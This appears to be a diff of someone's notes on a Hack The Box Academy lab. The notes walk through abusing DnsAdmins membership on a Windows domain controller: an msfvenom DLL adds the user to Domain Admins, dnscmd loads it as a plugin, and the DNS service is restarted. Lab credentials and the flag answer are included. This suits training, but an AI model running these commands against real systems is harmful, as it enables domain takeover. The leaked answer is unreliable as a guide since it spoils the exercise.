@@ -4,7 +4,24 @@
 I think its cause the module just uses a boof ass .dll and not reverse shell so ima try the steps again tomorrow with a reverse shell and see if that helps. 
 
 
-xfreerdp /v:10.129.80.73 /u:netadm /p:HTB_@cademy_stdnt! /drive:shared,/home/htb-ac-1235531/Desktop
+Challenge : RDP to 10.129.5.92 (ACADEMY-WINLPE-DC01) with user "netadm" and password "HTB_@cademy_stdnt!"
+Question 1 - Leverage membership in the DnsAdmins group to escalate privileges. Submit the contents of the flag located at c:\Users\Administrator\Desktop\DnsAdmins\flag.txt 
+
+1) ON KALI : msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll 
+2) xfreerdp /v:10.129.43.42/u:netadm /p:HTB_@cademy_stdnt! /drive:shared,/home/htb-ac-1235531/Desktop
+3) copy over from RDP file share to netadm desktop 
+4) cmd on RDP - dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+5) dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+6) sc.exe sdshow DNS -> confirm the netadm SID is in there 
+7) sc stop dns
+8) sc start dns 
+9) net group "Domain Admins" /dom -> confirm that netadm is added
+10) logoff command 
+11) re-enter rdp command on Kali box
+12) open cmd as admin in RDP session and type -> whjoami /groups -> confirm we are in admins group now
+13) type C:\Users\Administrator\Desktop\DnsAdmins\flag.txt -> Dll_abus3_ftw!
+
+
 
 dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
 
